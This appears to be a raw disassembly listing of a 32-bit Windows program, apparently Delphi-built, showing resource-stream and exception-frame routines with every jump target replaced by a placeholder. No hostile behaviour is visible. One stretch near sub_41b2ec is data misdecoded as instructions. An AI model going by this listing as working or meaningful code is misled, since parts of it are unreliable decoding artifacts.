add [ eax + 0xc ] edx
jmp r-xdata
dec cx
je r-xdata
add edx [ eax + 0x8 ]
mov [ eax + 0xc ] edx
jmp r-xdata
sub_41af44
push ebx
push esi
call sub_403644
mov ebx edx
mov esi eax
mov eax esi
call sub_41af70
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403280
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40362c
sub_41af88
push ebx
push esi
push edi
mov edi edx
mov esi eax
push 0x0
push 0x0
mov eax edi
call sub_41a880
mov eax edi
mov edx [ eax ]
call [ edx ]
mov ebx eax
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x4 ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx [ esi + 0x4 ]
mov ecx ebx
mov eax edi
call sub_41aa8c
sub_41afc0
push ebx
push ecx
mov [ esp ] edx
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov edx eax
mov ecx [ ebx + 0x8 ]
mov eax ebx
call sub_41aee0
mov eax [ esp ]
mov [ ebx + 0x10 ] eax
pop edx
pop ebx
retn
sub_41afe8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ ebx + 0xc ]
mov edx esi
mov eax ebx
call sub_41afc0
mov [ ebx + 0x8 ] esi
cmp esi edi
jge r-xdata
pop edi
pop esi
pop ebx
retn
mov cx 0x2
xor edx edx
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x14 ]
sub_41b014
push ebx
push esi
push edi
cmp [ edx ] 0x0
jle r-xdata
mov esi [ eax + 0x4 ]
mov ecx esi
mov edi [ edx ]
mov ebx [ eax + 0x10 ]
cmp edi ebx
je r-xdata
mov ecx [ edx ]
cmp ecx [ eax + 0x8 ]
je r-xdata
mov eax ecx
pop edi
pop esi
pop ebx
retn
cmp [ edx ] 0x0
jne r-xdata
mov ecx [ edx ]
add ecx 0x1fff
and ecx 0xffffe000
mov [ edx ] ecx
test ebx ebx
jne r-xdata
mov eax esi
call sub_406b2c
xor ecx ecx
jmp r-xdata
mov ecx [ rw-data ]
movzx ecx [ ecx ]
mov edx [ edx ]
mov eax esi
call sub_406b10
mov ecx eax
mov eax [ rw-data ]
movzx eax [ eax ]
mov edx [ edx ]
call sub_406b00
mov ecx eax
jmp r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b84c
call sub_403a44
test ecx ecx
jne r-xdata
sub_41b0a0
push ebx
push esi
push edi
push ebp
mov esi ecx
mov ebp edx
mov ebx eax
mov eax [ ebx + 0xc ]
test eax eax
jl r-xdata
xor eax eax
test esi esi
jl r-xdata
mov edi eax
add edi esi
test edi edi
jle r-xdata
cmp edi [ ebx + 0x8 ]
jle r-xdata
mov edx [ ebx + 0x4 ]
add edx [ ebx + 0xc ]
mov eax ebp
mov ecx esi
call sub_4028c8
mov [ ebx + 0xc ] edi
mov eax esi
jmp r-xdata
cmp edi [ ebx + 0x10 ]
jle r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ ebx + 0x8 ] edi
mov edx edi
mov eax ebx
call sub_41afc0
sub_41b0f0
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403260
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
call sub_4044c8
mov ecx eax
mov edx esi
mov eax edi
call sub_41b1b8
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035dc
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
call sub_403634
pop [ fs : 0x0 ]
add esp 0xc
sub_41b148
push ebp
mov ebp esp
add esp 0xfffffff4
xor eax eax
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_41b1ab
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x6
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405d38
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7cc
call sub_403a44
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b1b2
lea eax [ ebp - 0xc ]
call sub_404008
retn
sub_41b1b8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push esi
call FindResourceA
mov edi eax
mov [ ebx + 0x10 ] edi
test edi edi
jne r-xdata
mov eax [ ebx + 0x10 ]
push eax
push esi
call LoadResource
mov edi eax
mov [ ebx + 0x14 ] edi
test edi edi
jne r-xdata
push ebp
call sub_41b148
pop ecx
mov eax [ ebx + 0x10 ]
push eax
push esi
call SizeofResource
push eax
mov eax [ ebx + 0x14 ]
push eax
call LockResource
mov edx eax
mov eax ebx
pop ecx
call sub_41aee0
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
push ebp
call sub_41b148
pop ecx
sub_41b224
push ebx
push esi
call sub_403644
mov ebx edx
mov esi eax
mov eax [ esi + 0x14 ]
call sub_406afc
mov eax [ esi + 0x14 ]
push eax
call FreeResource
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403280
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40362c
sub_41b274
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
mov esi [ ebp + 0x8 ]
mov [ edi + 0x4 ] ecx
mov eax esi
call sub_4026cc
mov [ edi + 0x8 ] eax
mov [ edi + 0xc ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035dc
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_403634
pop [ fs : 0x0 ]
add esp 0xc
sub_41b2bc
push ebx
push esi
call sub_403644
mov ebx edx
mov esi eax
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
test bl bl
jle r-xdata
mov edx [ esi + 0xc ]
call sub_4026ec
pop esi
pop ebx
retn
mov eax esi
call sub_40362c
sub_41b2ec
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp [ ebx + 0x41 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push edx
mov bl 0x41
add [ eax ] bl
add [ eax ] al
add [ eax - 0x3fffbff0 ] dh
xor al 0x40
add ah cl
xor al 0x40
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al cl
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
xor [ edx ] 0x40
add [ eax - 0x4c ] ah
inc ecx
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + edx + 0x100040 ] dl
add [ eax ] al
xchg esp eax
adc [ eax ] al
adc al 0x0
add [ eax ] al
or dl [ eax + edx * 2 + 0x72 ]
outsd
jo r-xdata
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
xor [ edx ] 0x40
add [ eax - 0x4c ] dh
inc ecx
add [ esi ] cl
push esp
push eax
jb r-xdata
imul edi [ eax + 0x75 ] r-xdata
lodsb [ esi ]
mov bl 0x41
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x180041b3 ] dh
add [ eax ] al
add al ch
mov dl 0x41
add al al
xor al 0x40
add ah cl
xor al 0x40
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al cl
xor al 0x40
fsubp st3
add [ ebx - 0x76 ] eax
adc eax [ edx + edx * 8 - 0x157ffa8c ]
r-xdata
jo r-xdata
inc ebx
cmp [ ebx ] 0x0
je r-xdata
call sub_403634
pop [ fs : 0x0 ]
add esp 0xc
outsb
je r-xdata
sub dl 0x2e
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebp ebx
sub ebp esi
mov ecx ebp
lea eax [ edi + 0x10 ]
mov edx esi
call sub_4040f8
mov ecx ebp
inc ecx
lea eax [ edi + 0x14 ]
mov edx 0x1
call sub_404568
mov al 0x1
mov esi [ edi + 0x14 ]
mov ebx esi
jmp r-xdata
inc esi
imul edi [ eax + 0x75 ] 0x8b559070
in al dx
push ebx
push esi
test dl dl
je r-xdata
mov dl [ ebx ]
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x4 ] ecx
mov eax [ ebp + 0x14 ]
mov [ esi + 0x8 ] eax
mov eax [ ebp + 0x10 ]
mov [ esi + 0xc ] eax
lea eax [ esi + 0x10 ]
mov edx [ ebp + 0xc ]
call sub_40405c
lea eax [ esi + 0x14 ]
mov edx [ ebp + 0x8 ]
call sub_40405c
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035dc
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x10
sub_41b3c0
push ebp
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x4 ] ecx
mov eax [ ebp + 0x14 ]
mov [ esi + 0x8 ] eax
mov eax [ ebp + 0x10 ]
mov [ esi + 0xc ] eax
lea eax [ esi + 0x10 ]
mov edx [ ebp + 0xc ]
call sub_40405c
lea eax [ esi + 0x14 ]
mov edx [ ebp + 0x8 ]
call sub_40405c
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035dc
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x10
call sub_403634
pop [ fs : 0x0 ]
add esp 0xc
sub_41b418
push ebx
push esi
push edi
push ebp
mov edi eax
xor eax eax
mov esi [ edi + 0x14 ]
mov ebx esi
jmp r-xdata
mov dl [ ebx ]
test dl dl
je r-xdata
cmp [ ebx ] 0x0
je r-xdata
sub dl 0x2e
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebp ebx
sub ebp esi
mov ecx ebp
lea eax [ edi + 0x10 ]
mov edx esi
call sub_4040f8
mov ecx ebp
inc ecx
lea eax [ edi + 0x14 ]
mov edx 0x1
call sub_404568
mov al 0x1
inc ebx
sub_41b470
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41b4e7
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_405874
test esi esi
je r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebx + 0xc ]
mov eax [ ebx + 0x4 ]
call sub_415354
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b4ee
lea eax [ ebp - 0x4 ]
call sub_405874
retn
mov eax [ ebx + 0xc ]
mov eax [ eax ]
mov eax [ eax ]
call sub_41469c
add eax 0x5
push eax
lea eax [ ebp - 0x4 ]
call sub_405874
mov ecx eax
mov eax esi
pop edx
call sub_40d0a4
test al al
jne r-xdata
lea eax [ ebp - 0x4 ]
call sub_405874
sub_41b4f4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_41b59a
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x4 ] eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b5a1
lea eax [ ebp - 0x8 ]
call sub_404008
retn
mov edi esi
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov eax ebx
jmp r-xdata
mov [ ebp - 0x4 ] edi
mov dl [ ebx ]
test dl dl
je r-xdata
mov ecx ebx
sub ecx eax
lea edx [ ebp - 0x8 ]
xchg edx eax
call sub_4040f8
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_420c1c
mov esi eax
test esi esi
jne r-xdata
add dl 0xd3
sub dl 0x2
jae r-xdata
test esi esi
je r-xdata
mov edx r-xdata
mov eax [ ebp - 0x8 ]
call sub_407e64
test al al
je r-xdata
inc ebx
cmp [ ebx ] 0x2e
jne r-xdata
mov esi edi
cmp [ ebx ] 0x2d
jne r-xdata
inc ebx
cmp [ ebx ] 0x3e
jne r-xdata
inc ebx
mov edi esi
inc ebx
sub_41b5bc
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx ebx
call sub_41836c
test eax eax
jge r-xdata
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx ebx
call sub_41836c
test eax eax
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx ebx
call sub_4181b4
sub_41b5f4
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx ebx
call sub_41836c
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx ebx
call sub_41836c
test eax eax
jge r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
xchg edx eax
call sub_418200
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx ebx
call sub_4181b4
sub_41b63c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor edx edx
push ebp
push sub_41b7d5
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
call sub_4186d4
mov edi eax
xor edx edx
push ebp
push sub_41b7b6
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ edi + 0x8 ] 0x0
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b7bd
mov eax [ rw-data ]
call sub_418738
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push sub_41b797
push [ fs : edx ]
mov [ fs : edx ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov [ ebp - 0x8 ] eax
xor edx edx
push ebp
push sub_41b745
push [ fs : edx ]
mov [ fs : edx ] esp
xor esi esi
jmp r-xdata
cmp esi [ edi + 0x8 ]
jl r-xdata
mov edx esi
mov eax edi
call sub_418310
mov ebx eax
mov eax [ ebx + 0x10 ]
call sub_417cd0
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b74c
mov eax [ ebp - 0x8 ]
call sub_403290
retn
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov edx [ ebx + 0xc ]
mov eax [ ebx + 0x4 ]
call sub_414924
test eax eax
je r-xdata
push ebp
mov eax [ ebx + 0x4 ]
call sub_41b5bc
pop ecx
mov edx esi
mov eax edi
call sub_418200
mov eax ebx
call sub_403290
jmp r-xdata
mov edx [ ebx + 0x14 ]
mov eax [ ebp - 0xc ]
call sub_41b4f4
mov edx eax
mov eax ebx
mov ecx [ eax ]
call [ ecx ]
push ebp
mov eax [ ebx + 0x4 ]
call sub_41b5f4
pop ecx
inc esi
sub_41b74c
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_403290
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
and [ edi + 0x1c ] 0xff7f
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_418310
mov edi eax
mov eax edi
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
sub_41b7e4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
call sub_4186d4
mov edi eax
xor eax eax
push ebp
push sub_41b87f
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ edi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_418738
retn
mov edx ebx
mov eax edi
call sub_418310
mov esi eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ esi + 0x8 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov edx ebx
mov eax edi
call sub_418200
mov eax esi
call sub_403290
mov edx [ esi + 0x10 ]
mov eax [ ebp - 0x8 ]
call sub_407e64
test al al
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_41b890
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
call sub_4186d4
mov edi eax
xor eax eax
push ebp
push sub_41b907
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ edi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_418738
retn
mov edx ebx
mov eax edi
call sub_418310
mov esi eax
mov eax [ esi + 0x4 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax edi
call sub_418200
mov eax esi
call sub_403290
sub_41b938
push ebx
add esp 0xfffffff8
mov ebx eax
mov [ esp ] ebx
mov [ esp + 0x4 ] 0xb
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b888
call sub_403a44
pop ecx
pop edx
pop ebx
retn
sub_41b97c
push ebx
push esi
push edi
call sub_403644
mov ebx edx
mov esi eax
mov edx [ esi + 0x10 ]
sub edx [ esi + 0x14 ]
mov eax [ esi + 0x4 ]
mov cx 0x1
mov edi [ eax ]
call [ edi + 0x14 ]
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41b2bc
test bl bl
jle r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_40362c
sub_41b9b8
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_41d890
cmp bl al
je r-xdata
pop esi
pop ebx
retn
dec [ esi + 0x10 ]
mov eax esi
call sub_41d9a0
call sub_41b92c
sub_41b9dc
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
mov edx [ ebx + 0x70 ]
mov eax esi
call sub_407e64
test al al
je r-xdata
pop esi
pop ebx
pop ebp
retn 0x10
cmp [ ebp + 0x12 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebp + 0x14 ]
call [ ebp + 0x10 ]
lea eax [ ebx + 0x70 ]
call sub_404008
sub_41ba10
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x70 ]
mov eax ebx
call sub_407e64
test al al
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn 0x10
cmp [ ebp + 0x12 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41d890
cmp al 0xa
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_41bad1
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0xc ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
call sub_41be54
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_41be54
mov eax [ ebp - 0x4 ]
mov [ eax + 0x78 ] 0x1
mov edx [ ebp - 0x8 ]
mov eax [ ebp + 0x14 ]
call [ ebp + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41bad8
mov eax [ ebp - 0x8 ]
call sub_403290
retn
mov eax [ ebp - 0x4 ]
dec [ eax + 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_41d9a0
mov eax [ ebp - 0x4 ]
mov [ eax + 0x78 ] 0x1
call sub_41b92c
sub_41bb00
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0x5a ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
push esp
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x5c ]
call [ ebx + 0x58 ]
sub_41bb20
push ebx
push esi
push edi
add esp 0xfffffef8
mov esi ecx
mov edi edx
mov ebx eax
lea eax [ esp + 0x8 ]
mov edx esi
mov ecx 0xff
call sub_4042a4
lea edx [ esp + 0x8 ]
mov eax [ edi ]
call sub_4034fc
mov [ esp ] eax
cmp [ esp ] 0x0
sete [ esp + 0x4 ]
cmp [ ebx + 0x3a ] 0x0
je r-xdata
cmp [ esp + 0x4 ] 0x0
je r-xdata
push esp
lea eax [ esp + 0x8 ]
push eax
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
mov eax [ esp ]
add esp 0x108
pop edi
pop esi
pop ebx
retn
call sub_41b92c
sub_41bb88
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi eax
mov eax [ rw-data ]
call sub_4186d4
mov esi eax
xor edx edx
push ebp
push sub_41bbf8
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx [ esi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41bbff
mov eax [ rw-data ]
call sub_418738
retn
mov edx ebx
mov eax esi
call sub_418310
mov edx [ eax + 0x4 ]
cmp edx [ edi + 0x4 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx [ eax + 0xc ]
cmp edx [ edi + 0xc ]
jne r-xdata
call sub_403290
mov edx ebx
mov eax esi
call sub_418200
sub_41bc04
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41bd13
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41bd1a
lea eax [ ebp - 0x8 ]
call sub_404008
retn
xor edx edx
push ebp
push sub_41bcf6
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_41bd48
retn
inc eax
mov [ ebp - 0xc ] eax
xor esi esi
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx ]
mov eax ebx
call sub_41b418
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov edx esi
call sub_418310
mov ebx eax
lea eax [ ebp - 0x8 ]
mov edx [ ebx + 0x14 ]
call sub_4040a0
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
mov eax [ ebx + 0x8 ]
mov edx [ ebp - 0x8 ]
call sub_41b4f4
mov edi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov edx esi
call sub_418310
call sub_41bb88
test edi edi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov edx esi
call sub_418310
mov edx eax
mov eax [ rw-data ]
call sub_41864c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
xor ecx ecx
mov edx esi
call sub_41845c
jmp r-xdata
inc esi
dec [ ebp - 0xc ]
jne r-xdata
sub_41bd24
push ebx
mov ebx eax
mov eax ebx
call sub_41be18
cdq
push edx
push eax
mov eax [ ebx + 0x4 ]
call sub_41a880
xor eax eax
mov [ ebx + 0x10 ] eax
xor eax eax
mov [ ebx + 0x14 ] eax
pop ebx
retn
sub_41bd48
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebx + 0x30 ]
call sub_403290
xor eax eax
mov [ ebx + 0x30 ] eax
inc esi
xor edi edi
mov edx edi
mov eax [ ebx + 0x30 ]
call sub_418310
call sub_403290
inc edi
dec esi
jne r-xdata
sub_41bd84
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] eax
mov eax edx
call sub_4031d8
mov ebp eax
jmp r-xdata
cmp ebp [ r-xdata ]
jne r-xdata
mov eax ebp
call sub_41779c
mov esi eax
test esi esi
je r-xdata
mov eax [ esp ]
mov eax [ eax + 0x74 ]
test eax eax
je r-xdata
mov eax ebp
call sub_40321c
mov ebp eax
movsx ebx [ esi ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ esp + 0x4 ]
call sub_417814
mov edi eax
mov edx [ esp + 0x4 ]
call sub_417714
mov edi eax
jmp r-xdata
inc ebx
mov [ esp + 0x8 ] 0x0
mov eax edi
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
inc [ esp + 0x8 ]
dec ebx
jne r-xdata
mov eax [ esp + 0x8 ]
mov eax [ esi + eax * 4 + 0x2 ]
mov edi [ eax ]
mov edx [ esp + 0x4 ]
mov eax edi
call sub_4031f4
test al al
jne r-xdata
sub_41be54
push esi
push edi
push ebx
mov edi edx
mov ebx ecx
mov esi eax
jmp r-xdata
or ebx ebx
jne r-xdata
mov ecx [ esi + 0x14 ]
sub ecx [ esi + 0x10 ]
ja r-xdata
pop ebx
pop edi
pop esi
retn
cmp ecx ebx
jb r-xdata
mov eax esi
call sub_41bea0
mov ecx [ esi + 0x14 ]
push esi
sub ebx ecx
mov eax [ esi + 0x8 ]
add eax [ esi + 0x10 ]
add [ esi + 0x10 ] ecx
mov esi eax
mov edx ecx
shr ecx 0x2
cld
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop esi
mov ecx ebx
sub_41bea0
push ebx
push esi
mov ebx eax
mov edx [ ebx + 0x8 ]
mov ecx [ ebx + 0xc ]
mov eax [ ebx + 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov esi eax
mov [ ebx + 0x14 ] esi
test esi esi
jne r-xdata
xor eax eax
mov [ ebx + 0x10 ] eax
pop esi
pop ebx
retn
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b84c
call sub_403a44
sub_41bef0
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_41bf3b
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_41d6f0
mov eax [ ebp - 0x4 ]
call sub_4042c8
dec eax
jle r-xdata
mov eax [ ebp - 0x4 ]
mov bl [ eax ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41bf42
lea eax [ ebp - 0x4 ]
call sub_404008
retn
call sub_41b92c
sub_41bf48
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
xor eax eax
push ebp
push sub_41bfe8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_41baec
test al al
jne r-xdata
mov eax ebx
call sub_41baec
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_418fac
jmp r-xdata
mov eax ebx
call sub_41be30
add al 0xfe
sub al 0x3
jae r-xdata
mov eax ebx
call sub_41ca58
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41bfef
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
retn
mov eax [ ebp - 0x4 ]
call sub_418ee0
mov esi eax
mov eax ebx
call sub_41ca50
jmp r-xdata
mov eax ebx
call sub_41c9a0
mov eax ebx
call sub_41baec
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_41cbbc
mov eax ebx
call sub_41ca58
sub_41c018
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_405000
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop esi
pop ebx
pop ebp
retn
inc ebx
xor esi esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax + esi * 4 ]
